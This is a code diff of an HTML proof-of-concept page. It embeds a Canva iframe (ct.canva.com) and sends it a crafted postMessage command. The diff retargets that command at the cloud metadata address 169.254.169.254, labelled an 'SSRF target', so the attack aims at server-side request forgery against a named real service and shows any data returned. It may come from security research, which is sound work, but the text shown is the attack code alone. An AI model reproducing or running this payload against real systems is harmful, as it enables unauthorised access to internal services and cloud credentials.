@@ -12,33 +12,29 @@
     style="width:100%; height:300px; border:1px solid black;"></iframe>
 
   <script>
-    // Wait for iframe and SW to be ready
     setTimeout(() => {
       const iframe = document.getElementById("targetFrame");
 
-      // Proper message format based on sw.js structure (type 1 = command)
       const message = {
-        clientId: "evil123",
-        type: 1,
+        clientId: "evilClient",
+        type: 1, // Command
         command: {
-          commandType: 0, // type 0 = fetch
+          commandType: 0, // GET
           params: {
-            url: "https://example.com", // Try internal service if SSRF is possible
-            method: 0,                  // GET
+            url: "http://169.254.169.254/latest/meta-data/", // SSRF target
+            method: 0,
             processResponse: true
           }
         }
       };
 
-      // Send message to iframe's contentWindow
+      // ✅ Canva's iframe should trust this
       iframe.contentWindow.postMessage(message, "https://ct.canva.com");
     }, 3000);
 
-    // Listen for response from iframe
     window.addEventListener("message", (event) => {
       if (event.origin === "https://ct.canva.com") {
-        console.log("Received data:", event.data);
-        alert("Received message:\n" + JSON.stringify(event.data, null, 2));
+        alert("✅ Response:\n" + JSON.stringify(event.data, null, 2));
       }
     });
   </script>
